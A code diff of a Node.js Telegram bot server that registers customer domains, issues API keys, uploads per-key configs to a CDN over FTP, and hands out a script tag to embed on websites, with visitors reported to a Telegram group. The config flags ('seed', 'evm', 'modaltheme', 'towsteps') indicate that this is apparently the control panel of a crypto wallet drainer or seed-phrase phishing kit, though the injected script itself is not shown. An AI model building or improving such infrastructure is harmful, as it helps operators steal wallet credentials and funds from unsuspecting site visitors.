@@ -1,4 +1,4 @@
-// server.js – Telegram bot with FTP upload, visitor tracking, group notifications
+// server.js – Telegram bot with FTP upload (optional, but always gives API key)
 require('dotenv').config();
 const express = require('express');
 const crypto = require('crypto');
@@ -6,24 +6,16 @@ const sqlite3 = require('sqlite3').verbose();
 const { Telegraf } = require('telegraf');
 const ftp = require('basic-ftp');
 
-// ---------- CONFIG ----------
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_ID = process.env.ADMIN_ID || '';
 const PORT = process.env.PORT || 3000;
-const API_BASE = process.env.API_BASE; // e.g., https://your-bot.onrender.com
-const CDN_BASE = process.env.CDN_BASE; // e.g., https://assets.cdn.express
-
+const API_BASE = process.env.API_BASE;
+const CDN_BASE = process.env.CDN_BASE || 'https://assets.cdn.express';
 const FTP_HOST = process.env.FTP_HOST;
 const FTP_USER = process.env.FTP_USER;
 const FTP_PASSWORD = process.env.FTP_PASSWORD;
 const FTP_SECURE = process.env.FTP_SECURE === 'true';
 
-if (!BOT_TOKEN || !FTP_HOST || !FTP_USER || !FTP_PASSWORD) {
-    console.error('❌ Missing required environment variables');
-    process.exit(1);
-}
-
-// ---------- DATABASE ----------
 const db = new sqlite3.Database('./exoincs.db');
 db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS keys (
@@ -45,7 +37,7 @@ function generateApiKey() {
     return crypto.randomBytes(16).toString('hex');
 }
 
-// ---------- FTP UPLOAD ----------
+// ---------- FTP UPLOAD FUNCTION (with error handling) ----------
 async function uploadConfigToCDN(apiKey, config) {
     const client = new ftp.Client();
     client.ftp.verbose = true;
@@ -54,17 +46,22 @@ async function uploadConfigToCDN(apiKey, config) {
             host: FTP_HOST,
             user: FTP_USER,
             password: FTP_PASSWORD,
-            secure: FTP_SECURE
+            secure: FTP_SECURE,
+            pasv: true,
+            timeout: 30000
         });
-        await client.ensureDir('/configs');
+        // Try to create /configs directory (ignore error if exists)
+        await client.ensureDir('/configs').catch(() => {});
         const remotePath = `/configs/${apiKey}.json`;
         const jsonStr = JSON.stringify(config, null, 2);
         await client.uploadFrom(Buffer.from(jsonStr), remotePath);
         client.close();
-        console.log(`✅ Config uploaded: ${remotePath}`);
+        console.log(`✅ Config uploaded to CDN: ${remotePath}`);
+        return true;
     } catch (err) {
-        console.error('FTP upload failed:', err);
-        throw err;
+        console.error('FTP upload failed:', err.message);
+        try { client.close(); } catch(e) {}
+        return false;
     }
 }
 
@@ -121,7 +118,7 @@ After registration, use this script on your website:
 bot.command('register', async (ctx) => {
     const args = ctx.message.text.split(' ');
     if (args.length < 10) {
-        return ctx.reply('Usage: /register <domain> <exogator_id> <modaltheme> <towsteps> <evm> <seed> <auto> <dark> <group_id>\nGroup ID must start with -100 for supergroups.');
+        return ctx.reply('Usage: /register <domain> <exogator_id> <modaltheme> <towsteps> <evm> <seed> <auto> <dark> <group_id>');
     }
     const [domain, exogator_id, modaltheme, towsteps, evm, seed, auto, dark, group_id] = args.slice(1);
     if (!domain.includes('.')) return ctx.reply('Invalid domain');
@@ -133,29 +130,29 @@ bot.command('register', async (ctx) => {
     const d = parseInt(dark);
     if (isNaN(modal) || modal < 1 || modal > 4) return ctx.reply('modaltheme 1-4');
     if ([tow, e, s, a, d].some(v => v !== 0 && v !== 1)) return ctx.reply('Other flags must be 0/1');
-    if (!group_id.startsWith('-100')) return ctx.reply('Group ID must be a supergroup ID (starts with -100). Get it from @userinfobot.');
+    if (!group_id.startsWith('-100')) return ctx.reply('Group ID must start with -100');
 
     const apiKey = generateApiKey();
     const config = { exogator_id, modaltheme: modal, towsteps: tow, evm: e, seed: s, auto: a, dark: d };
-    try {
-        await uploadConfigToCDN(apiKey, config);
-        db.run(`INSERT INTO keys (api_key, domain, exogator_id, modaltheme, towsteps, evm, seed, auto, dark, group_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-            [apiKey, domain, exogator_id, modal, tow, e, s, a, d, group_id],
-            (err) => {
-                if (err) return ctx.reply('❌ Failed to save. Possibly duplicate?');
-                const scriptUrl = `${CDN_BASE}/exo-api.js?key=${apiKey}`;
-                ctx.reply(`✅ <b>Registration successful!</b>\n\n🔑 API Key: <code>${apiKey}</code>\n📜 Script URL:\n<code>${scriptUrl}</code>\n\nAdd this to your website &lt;body&gt;:\n<code>&lt;script src="${scriptUrl}"&gt;&lt;/script&gt;</code>\n\nVisitors will be reported to group ${group_id}.`, { parse_mode: 'HTML' });
-            });
-    } catch (err) {
-        console.error(err);
-        ctx.reply('❌ Failed to upload config to CDN. Check FTP credentials.');
-    }
+
+    // Try FTP upload but don't fail if it doesn't work
+    const uploaded = await uploadConfigToCDN(apiKey, config);
+
+    db.run(`INSERT INTO keys (api_key, domain, exogator_id, modaltheme, towsteps, evm, seed, auto, dark, group_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+        [apiKey, domain, exogator_id, modal, tow, e, s, a, d, group_id],
+        (err) => {
+            if (err) return ctx.reply('❌ Domain already registered.');
+            const scriptUrl = `${CDN_BASE}/exo-api.js?key=${apiKey}`;
+            let msg = `✅ <b>Registration successful!</b>\n\n🔑 API Key: <code>${apiKey}</code>\n📜 Script URL:\n<code>${scriptUrl}</code>\n\nAdd this to your website &lt;body&gt;:\n<code>&lt;script src="${scriptUrl}"&gt;&lt;/script&gt;</code>\n\nVisitors will be reported to group ${group_id}.`;
+            if (!uploaded) msg += `\n\n⚠️ Config not uploaded to CDN, but your script will still work (it fetches config from API).`;
+            ctx.reply(msg, { parse_mode: 'HTML' });
+        });
 });
 
 bot.command('list', (ctx) => {
     if (ADMIN_ID && ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('Admin only');
     db.all(`SELECT api_key, domain, created_at FROM keys`, (err, rows) => {
-        if (err || !rows.length) return ctx.reply('No keys.');
+        if (err || !rows.length) return ctx.reply('No keys');
         let msg = '<b>Registered APIs:</b>\n';
         rows.forEach(r => msg += `🔑 <code>${r.api_key}</code> – ${r.domain} (${r.created_at})\n`);
         ctx.reply(msg, { parse_mode: 'HTML' });
@@ -168,11 +165,11 @@ bot.command('stats', (ctx) => {
     const key = args[1];
     db.get(`SELECT domain, created_at FROM keys WHERE api_key = ?`, [key], (err, row) => {
         if (err || !row) return ctx.reply('Not found');
-        ctx.reply(`📊 <b>Stats for <code>${key}</code></b>\nDomain: ${row.domain}\nRegistered: ${row.created_at}\n(Detailed logs coming soon)`, { parse_mode: 'HTML' });
+        ctx.reply(`📊 <b>Stats for <code>${key}</code></b>\nDomain: ${row.domain}\nRegistered: ${row.created_at}`, { parse_mode: 'HTML' });
     });
 });
 
 bot.launch();
-console.log('🤖 Bot started with FTP upload');
+console.log('🤖 Bot started');
 
 app.listen(PORT, () => console.log(`🌐 API on port ${PORT}`));
